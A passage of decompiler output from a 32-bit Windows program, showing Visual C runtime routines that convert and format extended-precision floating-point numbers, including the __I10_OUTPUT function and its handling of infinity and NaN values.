          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_0042b6c4 + ((int)DAT_0042b6c4 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042b6c4 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_0042b6cc + DAT_0042b6b8;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_00420188;
      }
      local_14 = DAT_0042b6bc - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_0042b6c0 - 1;
      iVar14 = (int)(DAT_0042b6c0 + ((int)DAT_0042b6c0 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_0042b6c0 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_0041ff74;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_0041ff74:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_0042b6c4 + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_00420188:
  uVar13 = iVar14 << (0x1fU - (char)DAT_0042b6c4 & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_0042b6c8 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_0042b6c8 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// WARNING: Removing unreachable block (ram,0x0042048d)
// WARNING: Removing unreachable block (ram,0x00420456)
// WARNING: Removing unreachable block (ram,0x0042083e)
// WARNING: Removing unreachable block (ram,0x00420465)
// WARNING: Removing unreachable block (ram,0x0042046d)
// WARNING: Removing unreachable block (ram,0x00420473)
// WARNING: Removing unreachable block (ram,0x00420476)
// WARNING: Removing unreachable block (ram,0x0042047d)
// WARNING: Removing unreachable block (ram,0x00420487)
// WARNING: Removing unreachable block (ram,0x004204e2)
// WARNING: Removing unreachable block (ram,0x004204dc)
// WARNING: Removing unreachable block (ram,0x004204e8)
// WARNING: Removing unreachable block (ram,0x00420505)
// WARNING: Removing unreachable block (ram,0x00420507)
// WARNING: Removing unreachable block (ram,0x0042050f)
// WARNING: Removing unreachable block (ram,0x00420512)
// WARNING: Removing unreachable block (ram,0x00420517)
// WARNING: Removing unreachable block (ram,0x0042051a)
// WARNING: Removing unreachable block (ram,0x00420847)
// WARNING: Removing unreachable block (ram,0x00420525)
// WARNING: Removing unreachable block (ram,0x0042085e)
// WARNING: Removing unreachable block (ram,0x00420865)
// WARNING: Removing unreachable block (ram,0x00420530)
// WARNING: Removing unreachable block (ram,0x00420543)
// WARNING: Removing unreachable block (ram,0x00420545)
// WARNING: Removing unreachable block (ram,0x00420552)
// WARNING: Removing unreachable block (ram,0x00420557)
// WARNING: Removing unreachable block (ram,0x0042055d)
// WARNING: Removing unreachable block (ram,0x00420566)
// WARNING: Removing unreachable block (ram,0x0042056d)
// WARNING: Removing unreachable block (ram,0x00420585)
// WARNING: Removing unreachable block (ram,0x00420596)
// WARNING: Removing unreachable block (ram,0x004205a4)
// WARNING: Removing unreachable block (ram,0x004205e3)
// WARNING: Removing unreachable block (ram,0x004205ec)
// WARNING: Removing unreachable block (ram,0x00420804)
// WARNING: Removing unreachable block (ram,0x004205fa)
// WARNING: Removing unreachable block (ram,0x00420604)
// WARNING: Removing unreachable block (ram,0x0042081f)
// WARNING: Removing unreachable block (ram,0x00420611)
// WARNING: Removing unreachable block (ram,0x00420618)
// WARNING: Removing unreachable block (ram,0x00420622)
// WARNING: Removing unreachable block (ram,0x00420627)
// WARNING: Removing unreachable block (ram,0x00420637)
// WARNING: Removing unreachable block (ram,0x0042063c)
// WARNING: Removing unreachable block (ram,0x00420646)
// WARNING: Removing unreachable block (ram,0x0042064b)
// WARNING: Removing unreachable block (ram,0x0042065d)
// WARNING: Removing unreachable block (ram,0x0042066a)
// WARNING: Removing unreachable block (ram,0x00420679)
// WARNING: Removing unreachable block (ram,0x00420686)
// WARNING: Removing unreachable block (ram,0x004206a3)
// WARNING: Removing unreachable block (ram,0x004206a7)
// WARNING: Removing unreachable block (ram,0x004206ae)
// WARNING: Removing unreachable block (ram,0x004206b7)
// WARNING: Removing unreachable block (ram,0x004206ba)
// WARNING: Removing unreachable block (ram,0x004206cb)
// WARNING: Removing unreachable block (ram,0x004206d9)
// WARNING: Removing unreachable block (ram,0x004206e4)
// WARNING: Removing unreachable block (ram,0x004206eb)
// WARNING: Removing unreachable block (ram,0x00420716)
// WARNING: Removing unreachable block (ram,0x0042071b)
// WARNING: Removing unreachable block (ram,0x00420726)
// WARNING: Removing unreachable block (ram,0x0042072f)
// WARNING: Removing unreachable block (ram,0x00420735)
// WARNING: Removing unreachable block (ram,0x00420738)
// WARNING: Removing unreachable block (ram,0x0042075e)
// WARNING: Removing unreachable block (ram,0x00420763)
// WARNING: Removing unreachable block (ram,0x00420768)
// WARNING: Removing unreachable block (ram,0x00420775)
// WARNING: Removing unreachable block (ram,0x00420786)
// WARNING: Removing unreachable block (ram,0x004207b7)
// WARNING: Removing unreachable block (ram,0x0042078c)
// WARNING: Removing unreachable block (ram,0x004207b2)
// WARNING: Removing unreachable block (ram,0x00420796)
// WARNING: Removing unreachable block (ram,0x004207ac)
// WARNING: Removing unreachable block (ram,0x004207a5)
// WARNING: Removing unreachable block (ram,0x004207ba)
// WARNING: Removing unreachable block (ram,0x004207e7)
// WARNING: Removing unreachable block (ram,0x004207c4)
// WARNING: Removing unreachable block (ram,0x0042064f)
// WARNING: Removing unreachable block (ram,0x0042062c)
// WARNING: Removing unreachable block (ram,0x00420822)
// WARNING: Removing unreachable block (ram,0x00420568)
// WARNING: Removing unreachable block (ram,0x0042082c)
// WARNING: Removing unreachable block (ram,0x0042086d)

void __cdecl
FUN_004201cb(undefined2 *param_1,char **param_2,char *param_3,int param_4,int param_5,int param_6,
            undefined4 param_7,int param_8)

{
  char cVar1;
  uint uVar2;
  int *piVar3;
  
  uVar2 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  if (param_8 == 0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    ___security_check_cookie_4(uVar2 ^ (uint)&stack0xfffffffc);
    return;
  }
  for (; (((cVar1 = *param_3, cVar1 == ' ' || (cVar1 == '\t')) || (cVar1 == '\n')) ||
         (cVar1 == '\r')); param_3 = param_3 + 1) {
  }
                    // WARNING: Could not recover jumptable at 0x0042025e. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)PTR_LAB_00420893)();
  return;
}



// WARNING: Removing unreachable block (ram,0x00420dfe)
// WARNING: Removing unreachable block (ram,0x00420e08)
// WARNING: Removing unreachable block (ram,0x00420e0d)
// Library Function - Single Match
//  _$I10_OUTPUT
// 
// Library: Visual Studio 2008 Release

void __cdecl
__I10_OUTPUT(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  short *psVar1;
  int iVar2;
  undefined **ppuVar3;
  int iVar4;
  int iVar5;
  bool bVar6;
  errno_t eVar7;
  undefined **ppuVar8;
  ushort *puVar9;
  ushort uVar10;
  ushort uVar11;
  int iVar12;
  ushort uVar13;
  uint uVar14;
  char cVar15;
  uint uVar16;
  short *psVar17;
  short *psVar18;
  ushort uVar19;
  ushort uVar20;
  int iVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  undefined4 *puVar25;
  char *pcVar26;
  ushort *local_70;
  undefined **local_6c;
  undefined **local_68;
  int local_5c;
  int local_58;
  int local_54;
  short local_50;
  ushort *local_4c;
  int local_48;
  int local_44;
  undefined2 local_40;
  undefined4 uStack_3e;
  ushort uStack_3a;
  undefined *local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined local_2c;
  undefined uStack_2b;
  undefined uStack_2a;
  undefined uStack_29;
  undefined4 local_24;
  ushort uStack_20;
  ushort uStack_1e;
  ushort uStack_1c;
  undefined local_1a;
  byte bStack_19;
  byte local_14;
  undefined uStack_13;
  ushort uStack_12;
  undefined4 local_10;
  ushort local_c;
  ushort uStack_a;
  uint local_8;
  
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  iVar4 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_14 = (byte)param_1;
  uStack_13 = (undefined)((uint)param_1 >> 8);
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_10._0_2_ = (ushort)param_2;
  iVar21 = CONCAT22((ushort)local_10,uStack_12);
  local_10._2_2_ = (ushort)(param_2 >> 0x10);
  local_c = param_3;
  uVar10 = param_3 & 0x8000;
  uVar14 = param_3 & 0x7fff;
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c = 0xcc;
  uStack_2b = 0xcc;
  uStack_2a = 0xfb;
  uStack_29 = 0x3f;
  if (uVar10 == 0) {
    *(undefined *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined *)(param_6 + 1) = 0x2d;
  }
  if ((((short)uVar14 == 0) && (param_2 == 0)) && (param_1 == 0)) {
    *param_6 = 0;
    *(byte *)(param_6 + 1) = ((uVar10 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)((int)param_6 + 3) = 1;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
    iVar2 = iVar4;
    goto LAB_0042119b;
  }
  if ((short)uVar14 == 0x7fff) {
    *param_6 = 1;
    if (((param_2 == 0x80000000) && (param_1 == 0)) || ((param_2 & 0x40000000) != 0)) {
      if ((uVar10 == 0) || (param_2 != 0xc0000000)) {
        if ((param_2 != 0x80000000) || (param_1 != 0)) goto LAB_004209f9;
        pcVar26 = s_1_INF_00428718;
      }
      else {
        if (param_1 != 0) {
LAB_004209f9:
          pcVar26 = s_1_QNAN_00428710;
          goto LAB_004209fe;
        }
        pcVar26 = s_1_IND_00428720;
      }
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 5;
    }
    else {
      pcVar26 = s_1_SNAN_00428728;
LAB_004209fe:
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 6;
    }
    param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
    goto LAB_0042119b;
  }
  local_50 = (short)(((uVar14 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar14 * 0x4d10
                    >> 0x10);
  uVar16 = (uint)local_50;
  local_24._0_2_ = 0;
  local_1a = (undefined)uVar14;
  bStack_19 = (byte)(uVar14 >> 8);
  uStack_1e = (ushort)local_10;
  uStack_1c = local_10._2_2_;
  local_24._2_2_ = (ushort)param_1;
  local_68 = &PTR_s_bad_allocation_0042b670;
  uStack_20 = uStack_12;
  if (-uVar16 != 0) {
    iVar5 = param_1;
    uVar14 = -uVar16;
    iVar2 = iVar4;
    if (0 < (int)uVar16) {
      local_68 = (undefined **)&DAT_0042b7d0;
      uVar14 = uVar16;
    }
    while (uVar14 != 0) {
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      iVar4 = CONCAT22(local_c,local_10._2_2_);
      local_68 = local_68 + 0x15;
      if ((uVar14 & 7) != 0) {
        ppuVar8 = local_68 + (uVar14 & 7) * 3;
        if (0x7fff < *(ushort *)ppuVar8) {
          local_40 = SUB42(*ppuVar8,0);
          uStack_3e._0_2_ = (undefined2)((uint)*ppuVar8 >> 0x10);
          ppuVar3 = ppuVar8 + 2;
          uStack_3e._2_2_ = SUB42(ppuVar8[1],0);
          uStack_3a = (ushort)((uint)ppuVar8[1] >> 0x10);
          ppuVar8 = (undefined **)&local_40;
          local_38 = *ppuVar3;
          iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e) + -1;
          uStack_3e._0_2_ = (undefined2)iVar2;
          uStack_3e._2_2_ = (undefined2)((uint)iVar2 >> 0x10);
        }
        local_58 = 0;
        local_14 = 0;
        uStack_13 = 0;
        uStack_12 = 0;
        local_10._0_2_ = 0;
        iVar21 = 0;
        local_10._2_2_ = 0;
        local_c = 0;
        iVar4 = 0;
        uStack_a = 0;
        uVar19 = (*(ushort *)((int)ppuVar8 + 10) ^ CONCAT11(bStack_19,local_1a)) & 0x8000;
        uVar11 = CONCAT11(bStack_19,local_1a) & 0x7fff;
        uVar13 = *(ushort *)((int)ppuVar8 + 10) & 0x7fff;
        uVar20 = uVar13 + uVar11;
        if (((uVar11 < 0x7fff) && (uVar13 < 0x7fff)) && (uVar20 < 0xbffe)) {
          if (0x3fbf < uVar20) {
            if (((uVar11 == 0) &&
                (uVar20 = uVar20 + 1,
                (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
               ((CONCAT22(uStack_1e,uStack_20) == 0 &&
                (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)))) {
              local_1a = 0;
              bStack_19 = 0;
              goto LAB_00420d0f;
            }
            if ((((uVar13 == 0) && (uVar20 = uVar20 + 1, ((uint)ppuVar8[2] & 0x7fffffff) == 0)) &&
                (ppuVar8[1] == (undefined *)0x0)) && (*ppuVar8 == (undefined *)0x0))
            goto LAB_00420b2e;
            local_5c = 0;
            puVar25 = &local_10;
            local_44 = 5;
            do {
              local_54 = local_44;
              if (0 < local_44) {
                local_70 = (ushort *)((int)&local_24 + local_5c * 2);
                local_6c = ppuVar8 + 2;
                do {
                  bVar6 = false;
                  uVar16 = puVar25[-1] + (uint)*local_70 * (uint)*(ushort *)local_6c;
                  if ((uVar16 < (uint)puVar25[-1]) ||
                     (uVar16 < (uint)*local_70 * (uint)*(ushort *)local_6c)) {
                    bVar6 = true;
                  }
                  puVar25[-1] = uVar16;
                  if (bVar6) {
                    *(short *)puVar25 = *(short *)puVar25 + 1;
                  }
                  local_70 = local_70 + 1;
                  local_6c = (undefined **)((int)local_6c + -2);
                  local_54 = local_54 + -1;
                } while (0 < local_54);
              }
              puVar25 = (undefined4 *)((int)puVar25 + 2);
              local_5c = local_5c + 1;
              local_44 = local_44 + -1;
            } while (0 < local_44);
            uVar20 = uVar20 + 0xc002;
            if ((short)uVar20 < 1) {
LAB_00420c3f:
              uVar20 = uVar20 - 1;
              if ((short)uVar20 < 0) {
                uVar16 = (uint)(ushort)-uVar20;
                uVar20 = 0;
                do {
                  if ((local_14 & 1) != 0) {
                    local_58 = local_58 + 1;
                  }
                  iVar4 = CONCAT22(uStack_a,local_c);
                  uVar22 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
                  uStack_a = uStack_a >> 1;
                  local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
                  uVar23 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
                  uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
                  uVar16 = uVar16 - 1;
                  local_10._0_2_ = (ushort)(uVar22 >> 1);
                  local_14 = (byte)uVar23;
                  uStack_13 = (undefined)(uVar23 >> 8);
                } while (uVar16 != 0);
                if (local_58 != 0) {
                  local_14 = local_14 | 1;
                }
              }
            }
            else {
              do {
                uVar13 = local_10._2_2_;
                uVar11 = uStack_12;
                if ((uStack_a & 0x8000) != 0) break;
                iVar21 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
                local_14 = (byte)iVar21;
                uStack_13 = (undefined)((uint)iVar21 >> 8);
                uStack_12 = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
                local_10._0_2_ = (ushort)iVar21 | uVar11 >> 0xf;
                local_10._2_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(uStack_a,local_c) * 2;
                local_c = (ushort)iVar21 | uVar13 >> 0xf;
                uVar20 = uVar20 - 1;
                uStack_a = (ushort)((uint)iVar21 >> 0x10);
              } while (0 < (short)uVar20);
              if ((short)uVar20 < 1) goto LAB_00420c3f;
            }
            if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
               (iVar4 = CONCAT22(local_c,local_10._2_2_),
               iVar21 = CONCAT22((ushort)local_10,uStack_12),
               (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
              if (CONCAT22((ushort)local_10,uStack_12) == -1) {
                uStack_12 = 0;
                local_10._0_2_ = 0;
                iVar21 = 0;
                if (CONCAT22(local_c,local_10._2_2_) == -1) {
                  local_10._2_2_ = 0;
                  local_c = 0;
                  if (uStack_a == 0xffff) {
                    uStack_a = 0x8000;
                    uVar20 = uVar20 + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                  else {
                    uStack_a = uStack_a + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                }
                else {
                  iVar4 = CONCAT22(local_c,local_10._2_2_) + 1;
                  local_10._2_2_ = (ushort)iVar4;
                  local_c = (ushort)((uint)iVar4 >> 0x10);
                }
              }
              else {
                iVar21 = CONCAT22((ushort)local_10,uStack_12) + 1;
                uStack_12 = (ushort)iVar21;
                local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar4 = CONCAT22(local_c,local_10._2_2_);
              }
            }
            local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
            uStack_12 = (ushort)iVar21;
            local_c = (ushort)((uint)iVar4 >> 0x10);
            local_10._2_2_ = (ushort)iVar4;
            if (uVar20 < 0x7fff) {
              bStack_19 = (byte)(uVar20 >> 8) | (byte)(uVar19 >> 8);
              local_24._0_2_ = uStack_12;
              local_24._2_2_ = (ushort)local_10;
              uStack_20 = local_10._2_2_;
              iVar5 = CONCAT22(local_10._2_2_,(ushort)local_10);
              uStack_1e = local_c;
              uStack_1c = uStack_a;
              local_1a = (undefined)uVar20;
            }
            else {
              uStack_20 = 0;
              uStack_1e = 0;
              local_24._0_2_ = 0;
              local_24._2_2_ = 0;
              iVar5 = 0;
              iVar12 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
              uStack_1c = (ushort)iVar12;
              local_1a = (undefined)((uint)iVar12 >> 0x10);
              bStack_19 = (byte)((uint)iVar12 >> 0x18);
            }
            goto LAB_00420d0f;
          }
LAB_00420b2e:
          uStack_1c = 0;
          local_1a = 0;
          bStack_19 = 0;
        }
        else {
          iVar21 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
        }
        uStack_20 = 0;
        uStack_1e = 0;
        local_24._0_2_ = 0;
        local_24._2_2_ = 0;
        iVar5 = 0;
        iVar21 = 0;
        iVar4 = 0;
      }
LAB_00420d0f:
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      local_c = (ushort)((uint)iVar4 >> 0x10);
      local_10._2_2_ = (ushort)iVar4;
      local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
      uStack_12 = (ushort)iVar21;
      param_1 = CONCAT22(uStack_12,local_24._2_2_);
      param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
      uVar14 = (int)uVar14 >> 3;
    }
  }
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  if (0x3ffe < (ushort)(uVar14 >> 0x10)) {
    local_50 = local_50 + 1;
    local_54 = 0;
    local_14 = 0;
    uStack_13 = 0;
    uStack_12 = 0;
    local_10._0_2_ = 0;
    local_10._2_2_ = 0;
    local_c = 0;
    uStack_a = 0;
    uVar16 = uVar14 >> 0x10 & 0x7fff;
    iVar21 = uVar16 + 0x3ffb;
    if (((ushort)uVar16 < 0x7fff) && ((ushort)iVar21 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar21) {
        if (((((ushort)uVar16 == 0) &&
             (iVar21 = uVar16 + 0x3ffc,
             (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
            (CONCAT22(uStack_1e,uStack_20) == 0)) &&
           (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)) {
          local_1a = 0;
          bStack_19 = 0;
          param_2 = 0;
          uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
          goto LAB_00420fd3;
        }
        local_5c = 0;
        puVar25 = &local_10;
        local_44 = 5;
        do {
          local_58 = local_44;
          if (0 < local_44) {
            local_4c = (ushort *)&local_2c;
            puVar9 = (ushort *)((int)&local_24 + local_5c * 2);
            do {
              bVar6 = false;
              uVar16 = puVar25[-1] + (uint)*local_4c * (uint)*puVar9;
              if ((uVar16 < (uint)puVar25[-1]) || (uVar16 < (uint)*local_4c * (uint)*puVar9)) {
                bVar6 = true;
              }
              puVar25[-1] = uVar16;
              if (bVar6) {
                *(short *)puVar25 = *(short *)puVar25 + 1;
              }
              local_4c = local_4c + -1;
              puVar9 = puVar9 + 1;
              local_58 = local_58 + -1;
            } while (0 < local_58);
          }
          puVar25 = (undefined4 *)((int)puVar25 + 2);
          local_5c = local_5c + 1;
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar21 = iVar21 + 0xc002;
        if ((short)iVar21 < 1) {
LAB_00420ecc:
          uVar20 = (ushort)(iVar21 + 0xffff);
          if ((short)uVar20 < 0) {
            uVar16 = -(iVar21 + 0xffff);
            uVar14 = uVar16 & 0xffff;
            uVar20 = uVar20 + (short)uVar16;
            do {
              if ((local_14 & 1) != 0) {
                local_54 = local_54 + 1;
              }
              iVar4 = CONCAT22(uStack_a,local_c);
              uVar16 = CONCAT22(local_10._2_2_,(ushort)local_10);
              iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
              local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
              uStack_a = uStack_a >> 1;
              local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
              uVar22 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
              uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
              uVar14 = uVar14 - 1;
              local_10._0_2_ = (ushort)(uVar16 >> 1);
              local_14 = (byte)uVar22;
              uStack_13 = (undefined)(uVar22 >> 8);
            } while (uVar14 != 0);
            if (local_54 != 0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar11 = local_10._2_2_;
            uVar20 = uStack_12;
            if ((short)uStack_a < 0) break;
            iVar4 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
            local_14 = (byte)iVar4;
            uStack_13 = (undefined)((uint)iVar4 >> 8);
            uStack_12 = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
            local_10._0_2_ = (ushort)iVar4 | uVar20 >> 0xf;
            local_10._2_2_ = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(uStack_a,local_c) * 2;
            local_c = (ushort)iVar4 | uVar11 >> 0xf;
            iVar21 = iVar21 + 0xffff;
            uStack_a = (ushort)((uint)iVar4 >> 0x10);
          } while (0 < (short)iVar21);
          uVar20 = (ushort)iVar21;
          if ((short)uVar20 < 1) goto LAB_00420ecc;
        }
        if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
           (iVar21 = CONCAT22(local_c,local_10._2_2_), uVar16 = CONCAT22((ushort)local_10,uStack_12)
